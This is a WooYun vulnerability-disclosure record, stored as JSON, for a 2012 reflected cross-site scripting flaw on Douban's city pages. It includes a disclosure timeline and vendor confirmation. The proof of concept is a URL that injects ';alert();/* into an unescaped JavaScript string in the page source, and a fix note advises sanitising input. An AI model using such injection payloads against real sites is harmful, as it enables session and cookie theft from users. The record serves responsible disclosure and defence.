{"id": 17226, "wybug_id": "wooyun-2012-011085", "wybug_title": "Douban反射型跨站", "wybug_corp": "豆瓣", "wybug_author": "free", "wybug_date": "2012-08-20 11:00", "wybug_open_date": "2012-10-04 11:01", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-08-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-09-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-09-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-09-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-10-04：\t细节向公众公开  简要描述： http://guangzhou.douban.com/ 详细说明：  可能会窃取或操纵客户会话和 cookie，它们可能用于模仿合法用户，从而使黑客能够以该用户身份查看或变更用户记录以及执行事务   漏洞证明：  \n\nview-source:http://beijing.douban.com/?';alert();/*\n<script type=\"text/javascript\">    (function (global) {        var newNode = global.document.createElement('script'),            existingNode = global.document.getElementsByTagName('script')[0],            adSource = 'http://erebor.douban.com/',            userId = '2025898',            browserId = 'S/AE5RYypw4',            ipAddress = '114.254.41.32',            criteria = '3:/?';alert();/*',            preview = '',            debug = false,            adSlots = ['dale_location_home_top_right'];        global.DoubanAdRequest = {src: adSource, uid: userId, bid: browserId, ip: ipAddress, crtr: criteria, prv: preview, debug: debug};        global.DoubanAdSlots = (global.DoubanAdSlots || []).concat(adSlots);        newNode.setAttribute('type', 'text/javascript');        newNode.setAttribute('src', 'http://img3.douban.com/js/packed_ad533989358.js');        newNode.setAttribute('async', true);        existingNode.parentNode.insertBefore(newNode, existingNode);    })(this);</script>\n   修复方案：  清理用户输入，并过滤出代码。   版权声明：转载请注明来源 free@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2012-08-23 13:20 厂商回复： 立即组织修复，谢谢～ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}